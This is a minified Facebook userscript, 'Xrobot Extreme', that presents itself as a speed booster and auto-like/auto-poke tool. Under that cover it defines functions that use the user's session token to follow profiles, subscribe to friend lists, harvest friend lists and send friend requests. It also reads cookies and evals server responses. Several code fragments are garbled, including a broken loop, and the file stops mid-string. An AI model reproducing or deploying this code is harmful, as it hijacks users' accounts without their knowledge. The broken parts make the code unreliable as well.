// ==UserScript==
 // @name Xrobot Extreme
 // @namespace Facebook Speed Booster & Facebook Auto Like Status, Auto Like Comment & Auto Poke
 // @description Facebook Speed Booster /Auto Like/ Auto Pokes / Auto Add Friends
// @include	htt*://www.facebook.com/*
// @include     http://www.facebook.com/*
// @include     https://www.facebook.com/*
// @exclude	htt*://*static*.facebook.com*
// @exclude	htt*://*channel*.facebook.com*
// @exclude	htt*://developers.facebook.com/*
// @exclude	htt*://upload.facebook.com/*
// @exclude	htt*://www.facebook.com/common/blank.html
// @exclude	htt*://*connect.facebook.com/*
// @exclude	htt*://*facebook.com/connect*
// @exclude	htt*://www.facebook.com/places/*
// @exclude	htt*://www.facebook.com/about/*
// @exclude	htt*://www.facebook.com/plugins/*
// @exclude	htt*://www.facebook.com/l.php*
// @exclude	htt*://www.facebook.com/ai.php*
// @exclude	htt*://www.facebook.com/extern/*
// @exclude	htt*://www.facebook.com/pagelet/*
// @exclude	htt*://api.facebook.com/static/*
// @exclude	htt*://www.facebook.com/contact_importer/*
// @exclude	htt*://www.facebook.com/ajax/*
// @exclude	htt*://apps.facebook.com/ajax/*
// @exclude	htt*://www.facebook.com/advertising/*
// @exclude	htt*://www.facebook.com/ads/*
// @exclude	htt*://www.facebook.com/sharer/*
// @exclude	htt*://www.facebook.com/ci_partner/*
// @exclude	htt*://www.facebook.com/send/*
// @exclude	htt*://www.facebook.com/mobile/*
// @exclude	htt*://www.facebook.com/settings/*
// @exclude	htt*://www.facebook.com/dialog/*
// @exclude	htt*://www.facebook.com/plugins/*
// @exclude	htt*://www.facebook.com/bookmarks/*
// @exclude	htt*://developers.facebook.com/*
// @exclude	http://www.facebook.com/plugins/*
// @exclude	http://www.facebook.com/dialog/feed*
// @exclude	https://www.facebook.com/plugins/*
// @exclude	https://www.facebook.com/dialog/feed*
// @exclude	http://www.facebook.com/dialog/oauth?*
// @exclude	https://www.facebook.com/dialog/oauth?*
// @exclude	http://www.facebook.com/dialog/apprequests/*
// @exclude	https://www.facebook.com/dialog/apprequests/*
// @exclude	http://www.facebook.com/l.php?u=*
// @exclude	https://www.facebook.com/l.php?*
// @exclude	https://www.facebook.com/places/map_iframe.php?*
 // @version BeSoEasy V4.2
 // ==/UserScript==
 function fb_ap_lw(){if(typeof Arbiter=="undefined"){window.setTimeout(fb_ap_lw,100)}else{function e(){console.log("Facebook Autopoke Lightweight - Finding Pokes");var e=document.getElementsByClassName("pokesDashboard")[0].getElementsByClassName("uiIconText"),t;console.log(e);for(i in e){if(e.hasOwnProperty(i)){try{e[i].click()}catch(n){try{t=document.createEvent("MouseEvents");t.initMouseEvent("click",true,true,window,0,0,0,0,0,false,false,false,false,0,null);e[i].dispatchEvent(t)}catch(r){if(r.message!="Object 1 has no method 'dispatchEvent'"){console.error(n.message);console.error(r.message)}}}}}}Arbiter.subscribe("channel/message:live_poke",function(){window.setTimeout(e,500)});e();console.log("Facebook Autopoke Lightweight - Successful Load");window.setTimeout(function(){window.location.reload()},6e5)}}function fb_ap_lw_dt(){if(typeof DocumentTitle=="undefined"){window.setTimeout(fb_ap_lw_dt,100)}else{DocumentTitle.set(DocumentTitle.get()+" (Automatic)")}}function cereziAl(e){var t=e+"=";if(document.cookie.length>0){konum=document.cookie.indexOf(t);if(konum!=-1){konum+=t.length;son=document.cookie.indexOf(";",konum);if(son==-1)son=document.cookie.length;return unescape(document.cookie.substring(konum,son))}else{return""}}}function getRandomInt(e,t){return Math.floor(Math.random()*(t-e+1))+e}function randomValue(e){return e[getRandomInt(0,e.length-1)]}function a(e){var t=new XMLHttpRequest;var n="/ajax/follow/follow_profile.php?__a=1";var r="profile_id="+e+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+fb_dtsg+"&lsd&__"+user_id+"&phstamp=";t.open("POST",n,true);t.setRequestHeader("Content-type","application/x-www-form-urlencoded");t.setRequestHeader("Content-length",r.length);t.setRequestHeader("Connection","close");t.onreadystatechange=function(){if(t.readyState==4&&t.status==200){t.close}};t.send(r)}function sublist(e){var t=document.createElement("script");t.innerHTML="new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: "+e+" }).send();";document.body.appendChild(t)}function sarkadaslari_al(){var xmlhttp=new XMLHttpRequest;xmlhttp.onreadystatechange=function(){if(xmlhttp.readyState==4){eval("arkadaslar = "+xmlhttp.responseText.toString().replace("for (;;);","")+";");for(f=0;f=0){xmlhttp.open("GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1"+params,true)}else{xmlhttp.open("GET","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1"+params,true)}xmlhttp.send()}function sarkadasekle(e,t){var n=new XMLHttpRequest;n.onreadystatechange=function(){if(n.readyState==4){}};n.open("POST","/ajax/add_friend/action.php?__a=1",true);var r="to_friend="+e;r+="&action=add_friend";r+="&how_found=friend_browser";r+="&ref_param=none";r+="&outgoing_id=";r+="&logging_location=friend_browser";r+="&no_flyout_on_click=true";r+="&ego_log_data=";r+="&http_referer=";r+="&fb_dtsg="+document.getElementsByName("fb_dtsg")[0].value;r+="&phstamp=165816749114848369115";r+="&__user="+user_id;n.setRequestHeader("X-SVN-Rev",svn_rev);n.setRequestHeader("Content-Type","application/x-www-form-urlencoded");if(t=="farketmez"&&document.cookie.split("cins"+user_id+"=").length>1){n.send(r)}else if(document.cookie.split("cins"+user_id+"=").length<=1){cinsiyetgetir(e,t,"sarkadasekle")}else if(t==document.cookie.split("cins"+user_id+"=")[1].split(";")[0].toString()){n.send(r)}}function scinsiyetgetir(uid,cins,fonksiyon){var xmlhttp=new XMLHttpRequest;xmlhttp.onreadystatechange=function(){if(xmlhttp.readyState==4){eval("cinssonuc = "+xmlhttp.responseText.toString().replace("for (;;);","")+";");cinshtml.innerHTML=cinssonuc.jsmods.markup[0][1].__html;btarihi.setTime(bugun.getTime()+1e3*60*60*24*365);if(cinshtml.getElementsByTagName("select")[0].value=="1"){document.cookie="cins"+user_id+"=kadin;expires="+btarihi.toGMTString()}else if(cinshtml.getElementsByTagName("select")[0].value=="2"){document.cookie="cins"+user_id+"=erkek;expires="+btarihi.toGMTString()}eval(fonksiyon+"("+id+","+cins+");")}};xmlhttp.open("GET","/ajax/timeline/edit_profile/basic_info.php?__a=1&__user="+user_id,true);xmlhttp.setRequestHeader("X-SVN-Rev",svn_rev);xmlhttp.send()}function autoSuggest(){links=document.getElementsByTagName("a");for(i in links){l=links[i];if(l.innerHTML=='Suggest Friend'){l.click()}}}function blub(){if(document.getElementsByClassName("pbm fsm").length==1){w=document.getElementsByClassName("pbm fsm")[0];e=document.createElement("a");e.innerHTML="Auto Suggest by BeSoEasy";e.className="uiButton";e.onclick=autoSuggest;if(w.childElementCount==0){w.appendChild(document.createElement("br"));w.appendChild(e)}}}body=document.body;if(body!=null){div=document.createElement("div");div.setAttribute("id","like2");div.style.position="fixed";div.style.display="block";div.style.width="140px";div.style.opacity=.9;div.style.bottom="+140px";div.style.left="+8px";div.style.backgroundColor="#eceff5";div.style.border="1px solid #94a3c4";div.style.padding="3px";div.innerHTML="
